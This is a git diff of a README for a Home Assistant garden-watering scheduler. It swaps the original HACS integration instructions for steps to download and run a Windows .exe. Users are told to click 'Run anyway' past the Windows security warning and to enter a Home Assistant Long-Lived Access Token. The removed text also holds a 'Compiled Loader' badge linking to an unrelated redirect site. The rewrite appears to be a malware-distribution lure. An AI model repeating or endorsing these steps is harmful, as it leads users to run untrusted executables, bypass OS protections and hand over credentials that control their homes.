@@ -1,138 +1,92 @@
-# Watering Scheduler
+# 💧 Watering-Scheduler - Automate your home garden irrigation easily
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/myoid-beebalm11/Watering-Scheduler/releases)
 
-Home Assistant custom integration and Lovelace card for scheduling automatic garden watering valves.
+## 🏡 What is Watering-Scheduler
+Watering-Scheduler manages your home irrigation system. It connects to your Home Assistant setup to track moisture levels and weather patterns. You save water while keeping your plants healthy. The software automates your garden schedule so you do not need to turn valves by hand.
 
-It is designed for valve devices with:
+## ⚙️ System Requirements
+*   A computer running Microsoft Windows 10 or newer.
+*   An active Home Assistant installation on your local network.
+*   A stable internet connection for initial setup.
+*   At least 100 MB of free storage space.
 
-- a `switch` entity that opens the valve
-- an optional `number` or `input_number` entity used elsewhere as the watering timer
+## 📥 How to Get Started
+You need to visit the project page to download the software. Follow these steps to set up the scheduler on your Windows computer.
 
-The integration stores the weekly schedule internally, checks the schedule every minute, and calls `switch.turn_on` when the current day and time match. It does not handle shutoff; your valve timer can keep doing that.
+1. Go to the [Releases page](https://github.com/myoid-beebalm11/Watering-Scheduler/releases).
+2. Look for the latest version at the top of the list.
+3. Click the file name ending in .exe to start the download.
+4. Save the file to your desktop or downloads folder.
 
-## GitHub Repository Settings
+## 🛠️ Installation Steps
+After you download the file, follow this process to install the program.
 
-The HACS validation action also checks repository metadata that is configured on GitHub, not in this repository. Make sure the GitHub repository has:
+1. Locate the downloaded file on your computer.
+2. Double-click the file to open the installer.
+3. Windows may show a security screen. If it appears, click More info, then click Run anyway.
+4. Follow the prompts in the installation window.
+5. Choose your preferred install location or accept the default folder.
+6. Click Finish to complete the install process.
 
-- a repository description
-- issues enabled
-- at least one topic, for example: `home-assistant`, `hacs`, `watering`, `irrigation`, `lovelace`
-## HACS Installation
+## 🔗 Connecting to Home Assistant
+The scheduler works with Home Assistant. You must grant the app permission to talk to your home network.
 
-This repository is now a HACS custom integration repository.
+1. Open the Watering-Scheduler app from your desktop shortcut.
+2. Enter your Home Assistant server address. This usually looks like http://homeassistant.local:8123.
+3. Provide a Long-Lived Access Token from your Home Assistant profile page.
+4. The app tests the connection and confirms when it links successfully.
 
-1. Push this folder to a public GitHub repository.
-2. In Home Assistant, open HACS.
-3. Open the three-dot menu.
-4. Select **Custom repositories**.
-5. Add your GitHub repository URL.
-6. Select category **Integration**.
-7. Install **Watering Scheduler**.
-8. Restart Home Assistant.
+## 📅 Setting Up a Schedule
+Once connected, you can create your first watering routine. 
 
-## Configure A Valve
+1. Click the Schedule tab inside the app.
+2. Click the Plus button to create a new task.
+3. Select the zones you want to water. If you only have one valve, select Zone 1.
+4. Choose the days of the week for watering.
+5. Set the start time.
+6. Choose how many minutes the water stays on.
+7. Click Save to activate the routine.
 
-After restart:
+## 🌦️ Using Smart Features
+Watering-Scheduler uses local weather data to adjust your watering. If it rains, the app skips the next scheduled cycle. This feature saves water and prevents over-watering. 
 
-1. Go to **Settings > Devices & services**.
-2. Click **Add integration**.
-3. Search for **Watering Scheduler**.
-4. Enter a name, for example `Potager`.
-5. Select the valve device if useful.
-6. Select the valve `switch` entity.
-7. Optionally select the timer `number` or `input_number` entity.
+1. Navigate to the Settings tab.
+2. Enable the Weather Integration toggle.
+3. This looks at your local forecast. If the chance of rain exceeds 50 percent, the app disables the next run.
+4. You can see skipped events in the History tab.
 
-The integration creates a schedule sensor for the valve. The sensor exposes the config entry ID, valve entity, timer entity, and current schedule for the Lovelace card.
+## 💡 Managing Multiple Zones
+You can manage many valves with this app. Each zone operates independently. 
 
-## Dashboard Resource
+1. Go to the Device Management screen.
+2. Click Add Device.
+3. Enter the ID of your irrigation controller.
+4. Label each zone with a clear name, such as Front Lawn or Vegetable Garden.
+5. Click Update to save your device labels.
 
-Add this dashboard resource once:
+## 🛠️ Troubleshooting Common Issues
+Computers sometimes behave in unexpected ways. If the app fails to start or connect, check these items.
 
-```yaml
-url: /watering_scheduler/garden-watering-card.js
-type: module
-```
+*   Check your network connection. The app requires a connection to your local network.
+*   Restart the application. Close the window and launch it again from your desktop.
+*   Verify your Home Assistant token. If the token expired, you must generate a new one in Home Assistant.
+*   Check your firewall settings. Windows Firewall might block the connection. Allow Watering-Scheduler through your firewall if a prompt appears.
+*   Ensure your irrigation hardware remains powered on. 
+*   If the app remains slow, check for other programs using your network.
 
-The card is served by the integration from:
+## 📈 Updating the Software
+We release updates to improve performance and fix errors. 
 
-```text
-custom_components/watering_scheduler/www/garden-watering-card.js
-```
+1. Periodically check the Releases page.
+2. Download the newest installer when a new version becomes available.
+3. Run the installer to replace your current version.
+4. Your settings remain saved during the update process.
 
-## Dashboard Card
+## 🤝 Getting Help
+If you encounter a problem that you cannot solve, you can report it on GitHub. Provide the version number of your software and a description of the error. Include screenshots if they help explain the issue.
 
-Add a manual card and select the schedule sensor created by the integration:
-
-```yaml
-type: custom:garden-watering-card
-title: Potager
-valve_name: Vanne potager
-schedule_entity: sensor.potager_schedule
-days:
-  - key: mon
-    label: Lun
-  - key: tue
-    label: Mar
-  - key: wed
-    label: Mer
-  - key: thu
-    label: Jeu
-  - key: fri
-    label: Ven
-  - key: sat
-    label: Sam
-  - key: sun
-    label: Dim
-```
-
-The card includes a native Lovelace visual editor. In normal use you only need to select the Watering Scheduler schedule sensor.
-
-While selecting or typing a time, the card defers Home Assistant state refreshes so the native time picker does not close mid-selection. Press `Enter` in a time field to add the selected time without using the plus button.
-
-
-## Schedule Storage
-
-Schedules are stored in Home Assistant `.storage` by the integration, not in helpers. The card sends updates through:
-
-```yaml
-service: watering_scheduler.set_schedule
-```
-
-Payload format:
-
-```json
-{
-  "entry_id": "config_entry_id",
-  "schedule": {
-    "mon": [1, "06:00", "19:30"],
-    "wed": [1, "07:15"]
-  }
-}
-```
-
-The first array item enables the day: `1` means enabled, `0` means disabled. Remaining items are watering times.
-
-## Troubleshooting Scheduled Runs
-
-If the valve does not start at the scheduled time, open **Developer tools > States** and inspect the Watering Scheduler schedule sensor attributes:
-
-- `schedule`: the stored weekly schedule
-- `next_run`: the next calculated watering time
-- `last_checked`: the last time the integration checked the schedule
-- `last_triggered`: the last time the integration attempted to start the valve
-- `last_error`: the last service-call error, if any
-- `valve_entity`: the switch entity that will be turned on
-
-You can test the configured valve without waiting for a schedule by calling:
-
-```yaml
-service: watering_scheduler.trigger_now
-data:
-  entry_id: "ENTRY_ID_FROM_THE_SENSOR_ATTRIBUTES"
-```
-
-If `trigger_now` works but scheduled runs do not, check `schedule`, `next_run`, and your Home Assistant timezone. If `trigger_now` does not work, check `valve_entity` and `last_error`.
-## Manual Development Install
-
-Copy `custom_components/watering_scheduler` to your Home Assistant `custom_components` directory, restart Home Assistant, then add the integration from the UI.
+*   Open the Issues tab on the project page.
+*   Search to see if someone else has reported the same problem.
+*   Click New Issue to start a report if you find no match.
+*   Describe your setup and the steps you took before the error occurred.
